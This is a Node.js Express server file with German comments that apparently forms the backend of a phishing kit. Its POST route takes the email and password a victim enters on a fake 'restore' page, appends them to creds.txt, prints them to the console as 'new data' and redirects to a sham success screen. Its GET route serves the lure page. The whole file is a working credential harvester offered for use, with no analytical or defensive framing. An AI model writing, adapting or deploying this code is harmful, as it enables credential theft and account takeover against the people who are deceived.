const express = require('express');
const app = express();
const fs = require('fs');

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Starte den Server
const server = app.listen(process.env.PORT || 3000, () => {
  console.log(`Server läuft auf Port ${server.address().port}`);
});

// Route: Wenn jemand auf "Wiederherstellen" klickt
app.post('/', (req, res) => {
  const email = req.body.email;
  const password = req.body.password;
  const time = new Date().toLocaleString();

  // Speichere in creds.txt
  const log = `[${time}] Email: ${email} | Password: ${password}\n`;
  fs.appendFileSync('creds.txt', log);

  console.log(`🔥 Neue Daten: ${email} / ${password}`);

  // Weiterleitung zum Erfolgsscreen
  res.redirect('/?success=true');
});

// Sende die HTML-Datei bei jeder anderen Anfrage
app.get('/', (req, res) => {
  res.sendFile(__dirname + '/index.html');
});